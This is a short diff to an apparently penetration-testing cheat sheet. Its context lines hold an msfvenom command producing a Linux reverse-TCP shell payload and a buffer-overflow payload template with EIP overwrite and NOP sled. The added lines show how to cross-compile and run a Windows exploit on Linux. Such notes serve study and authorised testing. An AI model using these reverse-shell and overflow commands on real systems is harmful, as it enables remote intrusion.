@@ -184,6 +184,9 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e 
 exploit_payload = 'A' * somesize + EIP + '\x90'*10 + reverse_shell_code
 ```
 
+## compile and run windows binary on linux
+- `i686-w64-mingw32-gcc 646.c -lws2_32 -o 646.exe`
+- `wine 646.exe arguments`
 
 ## create user account
 Linux:
